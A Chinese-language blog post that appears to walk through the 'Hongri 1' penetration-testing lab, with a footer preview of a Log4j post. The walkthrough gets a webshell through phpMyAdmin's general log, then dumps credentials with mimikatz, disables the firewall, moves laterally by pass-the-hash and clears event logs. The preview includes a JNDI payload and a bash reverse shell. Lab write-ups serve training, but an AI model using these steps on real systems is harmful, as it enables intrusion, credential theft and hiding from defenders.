<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>红日1 | Hundredsu'Blog</title><meta name="author" content="Hundredsu"><meta name="copyright" content="Hundredsu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="环境搭建 安装好三台靶机    默认密码为 hongrisec@2019 配置两张网卡  NAT和vm1   查看网卡配置成功 配置kali（vps） 一张网卡，NAT模拟公网  192.168.5.129 配置win7（web服务器跳板机） (NAT、VMnet1- 52.0&#x2F;24)    改密码为hongrisec@2025 首次登录成功后，需要进行重启，否则phpstudy可能启动不了">
<meta property="og:type" content="article">
<meta property="og:title" content="红日1">
<meta property="og:url" content="https://hundredsu.github.io/post/633b4305.html">
<meta property="og:site_name" content="Hundredsu&#39;Blog">
<meta property="og:description" content="环境搭建 安装好三台靶机    默认密码为 hongrisec@2019 配置两张网卡  NAT和vm1   查看网卡配置成功 配置kali（vps） 一张网卡，NAT模拟公网  192.168.5.129 配置win7（web服务器跳板机） (NAT、VMnet1- 52.0&#x2F;24)    改密码为hongrisec@2025 首次登录成功后，需要进行重启，否则phpstudy可能启动不了">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://hundredsu.github.io/img/avatar.jpg">
<meta property="article:published_time" content="2025-04-05T08:24:14.000Z">
<meta property="article:modified_time" content="2025-04-05T08:47:50.319Z">
<meta property="article:author" content="Hundredsu">
<meta property="article:tag" content="靶机渗透">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hundredsu.github.io/img/avatar.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "红日1",
  "url": "https://hundredsu.github.io/post/633b4305.html",
  "image": "https://hundredsu.github.io/img/avatar.jpg",
  "datePublished": "2025-04-05T08:24:14.000Z",
  "dateModified": "2025-04-05T08:47:50.319Z",
  "author": [
    {
      "@type": "Person",
      "name": "Hundredsu",
      "url": "https://hundredsu.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/avatar.jpg"><link rel="canonical" href="https://hundredsu.github.io/post/633b4305.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.3.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '红日1',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/avatar.jpg" alt="Logo"><span class="site-name">Hundredsu'Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">红日1</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">红日1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-05T08:24:14.000Z" title="发表于 2025-04-05 16:24:14">2025-04-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-05T08:47:50.319Z" title="更新于 2025-04-05 16:47:50">2025-04-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="MsYgn">环境搭建</h1>
安装好三台靶机



<p>默认密码为</p>
<p>hongrisec@2019</p>
<p>配置两张网卡  NAT和vm1</p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/1.png"></p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/2.png"></p>
<p>查看网卡配置成功</p>
<h2 id="vM2Iz">配置kali（vps）</h2>
一张网卡，NAT模拟公网

<p>192.168.5.129</p>
<h2 id="t0xid">配置win7（web服务器跳板机）</h2>
(NAT、VMnet1- 52.0/24)



<p>改密码为hongrisec@2025</p>
<p>首次登录成功后，需要进行重启，否则phpstudy可能启动不了</p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/3.png"></p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/4.png"></p>
<p>配置成功</p>
<p>cmd检查一下，如果这里没显示两个不同网段的ip，那么就去修改网卡，直到成功为止</p>
<p>这里注意 第一个网卡固定为192.168.52.0&#x2F;24</p>
<p>所以将网卡2改为NAT以模拟外网</p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/5.png"></p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/6.png"></p>
<h2 id="cJu1g"><font style="color:rgb(79, 79, 79);">域内主机 Win2k3（VMnet3- 52.141）</font></h2>
显示要修改密码

<p>修改为hongrisec@2025</p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/7.png"></p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/8.png"></p>
<h2 id="qKUDT"><font style="color:rgb(79, 79, 79);">域控 </font><font style="color:rgb(78, 161, 219) !important;">Server</font><font style="color:rgb(79, 79, 79);"> 2008 R2（VMnet3 - 52.138）</font></h2>
同样需要修改密码

<p>修改为hongrisec@2025</p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/9.png"></p>
<h1 id="CaDm4">环境</h1>
同下 配置成功

<p><img src="/img/%E7%BA%A2%E6%97%A51/10.png"></p>
<p>模拟外网网段：192.168.5.0&#x2F;24</p>
<p>模拟内网网段：192.168.52.0&#x2F;24</p>
<p>攻击机</p>
<p>win11:192.168.5.1</p>
<p>kali:192.168.5.129</p>
<h1 id="SW3VX">信息收集</h1>
`fs.exe -h 192.168.5.130-255`#这里这么扫是因为避开扫kali和物理机，正常应该为xxx.xxx.xxx.0/24

<p><img src="/img/%E7%BA%A2%E6%97%A51/11.png"></p>
<p>端口</p>
<p>192.168.5.130:80 open</p>
<p>192.168.5.130:3306 open</p>
<p>[*] alive ports len is: 2</p>
<p>start vulscan</p>
<p>[*] WebTitle <a target="_blank" rel="noopener" href="http://192.168.72.128/">http://192.168.72.128</a>     code:200 len:14749  title:phpStudy 探针 2014</p>
<h1 id="uFaX0">外网打点</h1>
访问80端口为phpinfo

<p><img src="/img/%E7%BA%A2%E6%97%A51/12.png"></p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/13.png"></p>
<p>尝试弱口令root和root，成功连接</p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/14.png"></p>
<p>使用工具直接连 连不上</p>
<p>dirsearch 扫一下目录</p>
<p>python dirsearch.py -u “<a target="_blank" rel="noopener" href="http://10.10.0.101"/">http://192.168.5.130"</a></p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/15.png"></p>
<p>扫出来phpmyadmin</p>
<p><a target="_blank" rel="noopener" href="http://10.10.0.101/phpmyadmin/">http://192.168.5.130/phpmyadmin/</a></p>
<p>直接访问，使用刚刚的弱口令登录成功</p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/16.png"></p>
<p>发现有个newyxcms的数据库</p>
<p>phpmyadmin可以尝试写文件getshell</p>
<hr>
<p>前提条件:</p>
<p>需要知道此网站的绝对路径</p>
<p>此网站目录是否可写</p>
<p>secure_file_priv没有值</p>
<hr>
<p><font style="color:rgb(0, 0, 0);">secure_file_priv是用来限制在那个目录下有读写权限的，再mysql 5.6.34版本后是默认NULL的，此mysql的版本为5.5.53并没有大于5.6.34 </font></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当它的值为NULL时，则表示不允许进行读写</span><br><span class="line">当它的值为一个路径时(例如/tmp),则表示只能再/tmp目录下读写 </span><br><span class="line">当它没有值时，则表示没有限制</span><br></pre></td></tr></table></figure>



<p><img src="/img/%E7%BA%A2%E6%97%A51/17.png"></p>
<p>刚刚的探针显示了绝对路径</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="string">&quot;secure_file_priv&quot;</span>;</span><br></pre></td></tr></table></figure>



<p><font style="color:rgb(30, 107, 184);"></font></p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/18.png"></p>
<p>执行发现思路断了</p>
<p>再查看日志记录开启没</p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/19.png"></p>
<p>默认关闭，那我们执行命令开启</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show variables  like  &#x27;general_log&#x27;;   #可以查看日志的读写是否开启</span><br><span class="line"></span><br><span class="line">set global general_log = on;           #开启此功能</span><br></pre></td></tr></table></figure>



<p><img src="/img/%E7%BA%A2%E6%97%A51/20.png"></p>
<p><font style="color:rgb(0, 0, 0);">开启功能成功，将日志文件的地址改为web目录下的php文件</font></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">show variables  like  &#x27;general_log_file&#x27;;      </span><br><span class="line">#查看日志的默认路径</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set global general_log_file=&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;;         </span><br><span class="line">#修改路径修改完地址，直接通过select来写入一下</span><br></pre></td></tr></table></figure>

<p>再次查询已经修改成功</p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/21.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_REQUEST[1]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="/img/%E7%BA%A2%E6%97%A51/22.png"></p>
<p>哥斯拉也连接成功</p>
<p>另一种方式</p>
<p>那么前面还发现了yxcms</p>
<p>fuzz一下，发现<a target="_blank" rel="noopener" href="http://10.10.0.101/yxcms/">http://192.168.5.130/yxcms/</a></p>
<p>能直接访问</p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/23.png"></p>
<p>并且从公告中发现了弱口令</p>
<p><a target="_blank" rel="noopener" href="http://10.10.0.101/yxcms//index.php?r=admin/index/login">http://10.10.0.101/yxcms//index.php?r=admin/index/login</a></p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/24.png"></p>
<p>由于是靶场 找到配置文件</p>
<p>直接修改为一句话木马</p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/25.png"></p>
<p>蚁剑直接连</p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/26.png"></p>
<p>发现权限为管理员</p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/27.png"></p>
<p>那么接下来我们需要cs上线</p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/28.png"></p>
<p>admin权限，所以我们直接一键提权</p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/29.png"></p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/30.png"></p>
<h1 id="w1lkx">后渗透</h1>
<h2 id="ZrJOi">内网信息收集</h2>
ipconfig /all

<p>查看到一个ip地址为<font style="color:rgb(238, 238, 238);background-color:rgb(0, 0, 0);">192.168.52.143</font></p>
<p>其dns服务器为<font style="color:rgb(238, 238, 238);background-color:rgb(0, 0, 0);">192.168.52.138</font></p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/31.png"></p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/32.png"></p>
<p>发现域控为owa.god.org</p>
<p>ping一下，确定ip为192.168.52.138</p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/33.png"></p>
<p>然后再net view &#x2F;domain</p>
<p>查看当前域,是存在GOD域的，既然有域，那么目标就清晰了，需要拿下域控</p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/34.png"></p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/35.png"></p>
<p>进行网络探测和端口扫描</p>
<p>加上已控制的跳板机web，共有3台机</p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/36.png"></p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/37.png"></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">域用户</span><br><span class="line">administrator</span><br><span class="line">ligang</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">域机器</span><br><span class="line">OWA.god.org <span class="number">192.168</span>.<span class="number">52.138</span> 域控</span><br><span class="line">ROOT<span class="literal">-TVI862UBEH</span>.god.org <span class="number">192.168</span>.<span class="number">52.141</span> 域内机器</span><br><span class="line">stu1.god.org <span class="number">192.168</span>.<span class="number">52.143</span> 域内机器(已拿下)</span><br></pre></td></tr></table></figure>



<p>接下来先尝试拿下192.168.52.141</p>
<h2 id="oSX4q">拿下域内主机</h2>

<p>方法一</p>
<p>上传mimikatz抓取密码(最好还是用蚁剑传，因为cs不是交互式)</p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/38.png"></p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/39.png"></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::logonPassword</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>或者方法二<img src="/img/%E7%BA%A2%E6%97%A51/40.png"></p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/41.png"></p>
<p>然后开启3389端口和关闭防火墙</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#关闭防火墙</span></span><br><span class="line">netsh firewall <span class="built_in">set</span> opmode disable      <span class="comment">#winsows server 2003 之前</span></span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off  <span class="comment">#winsows server 2003 之后</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注册表开启3389端口</span></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">00000000</span> /f</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加防火墙规则</span></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;Open 3389&quot;</span> <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow protocol=TCP localport=<span class="number">3389</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/%E7%BA%A2%E6%97%A51/42.png"></p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/43.png"></p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/44.png"></p>
<p>注意是god&#x2F;administrator</p>
<p>已连上</p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/45.png"></p>
<p>下面是通过哈希传递攻击PTH拿下域控主机</p>
<blockquote>
<p><font style="color:rgb(0, 0, 0);">在域环境中，利用哈希传递攻击的渗透方式往往是这样的：</font></p>
<p><font style="color:rgb(0, 0, 0);">1.获得一台域主机的权限，Dump 内存获得该主机的用户密码 Hash 值</font></p>
<p><font style="color:rgb(0, 0, 0);">2.通过哈希传递攻击尝试登录其他主机</font></p>
<p><font style="color:rgb(0, 0, 0);">3.继续搜集 Hash 并尝试远程登录，直到获得域管理员账户 Hash，登录域控，最终成功控制整个域</font></p>
</blockquote>
<p>前面就已经抓取过了</p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/46.png"></p>
<p>NTLM     : ad8b1b80e5d43bd61ab6796242bc7daa</p>
<p>创建smb监听器</p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/47.png"></p>
<p>使用psexec进行横向</p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/48.png"></p>
<p>先横192.168.52.141吧</p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/49.png"></p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/50.png"></p>
<p>成功上线</p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/51.png"></p>
<p>重复操作</p>
<p>拿下域控</p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/52.png"></p>
<p><img src="/img/%E7%BA%A2%E6%97%A51/53.png"></p>
<p>痕迹清理</p>
<p>win7</p>
<p>wevtutil cl system 清除系统日志<br>wevtutil cl application 清除应用程序日志<br>wevtutil cl security 清除安全日志<br>netsh interface portproxy show all 查看转发的端口情况<br>netsh interface portproxy delete v4tov4 listenaddress&#x3D;192.168.52.143 listenport&#x3D;5557 清理转发的端口</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/UKbUQkVkl3aNJ9NCN4IngA">https://mp.weixin.qq.com/s/UKbUQkVkl3aNJ9NCN4IngA</a></p>
<h1 id="fDJqT">总结</h1>
![](/img/红日1/54.png)

<ol>
<li>整理一下<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">phpmyadmin的getshell方法</font></li>
<li><font style="color:#000000;background-color:rgba(255, 255, 255, 0);">简单熟悉了一下工具的使用和环境的搭建</font></li>
</ol>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://Hundredsu.github.io">Hundredsu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://hundredsu.github.io/post/633b4305.html">https://hundredsu.github.io/post/633b4305.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://Hundredsu.github.io" target="_blank">Hundredsu'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/">靶机渗透</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/post/4a17b156.html" title="Hello World"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Hello World</div></div><div class="info-2"><div class="info-item-1">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot;  More info: Writing Run server1$ hexo server  More info: Server Generate static files1$ hexo generate  More info: Generating Deploy to remote sites1$ hexo deploy  More info: Deployment </div></div></div></a><a class="pagination-related" href="/post/f9f48cab.html" title="cve-2021-44228-Log4j2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">cve-2021-44228-Log4j2</div></div><div class="info-2"><div class="info-item-1">cve-2021-44228-Log4j2 利用到的工具  JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar  JNDIExploit-2.0-SNAPSHOT.jar 一台vps    log4j2 cve-2021-44228 利用 ##### 探测是否存在漏洞  先获取一个DNS的地址 123456#探测是否存在漏洞$&#123;jndi:ldap://123.7k8ovf.ceye.io&#125;#获取版本$&#123;jndi:ldap://$&#123;sys:java.version&#125;.7k8ovf.ceye.io&#125;      dns平台回显  java版本为 11.8.0_312    getshell在vps开个监听 1nc -lvnp 4444     1bash -i &gt;&amp; /dev/tcp/47.113.229.136/4444...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Hundredsu</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Hundredsu"><i class="fab fa-github"></i><span>关注我</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Hundredsu" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">这是Hundredsu的博客,随缘更新</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MsYgn"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#vM2Iz"><span class="toc-number">1.1.</span> <span class="toc-text">配置kali（vps）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#t0xid"><span class="toc-number">1.2.</span> <span class="toc-text">配置win7（web服务器跳板机）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cJu1g"><span class="toc-number">1.3.</span> <span class="toc-text">域内主机 Win2k3（VMnet3- 52.141）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#qKUDT"><span class="toc-number">1.4.</span> <span class="toc-text">域控 Server 2008 R2（VMnet3 - 52.138）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CaDm4"><span class="toc-number">2.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SW3VX"><span class="toc-number">3.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#uFaX0"><span class="toc-number">4.</span> <span class="toc-text">外网打点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#w1lkx"><span class="toc-number">5.</span> <span class="toc-text">后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ZrJOi"><span class="toc-number">5.1.</span> <span class="toc-text">内网信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#oSX4q"><span class="toc-number">5.2.</span> <span class="toc-text">拿下域内主机</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fDJqT"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/f9f48cab.html" title="cve-2021-44228-Log4j2">cve-2021-44228-Log4j2</a><time datetime="2025-04-05T08:35:07.000Z" title="发表于 2025-04-05 16:35:07">2025-04-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/633b4305.html" title="红日1">红日1</a><time 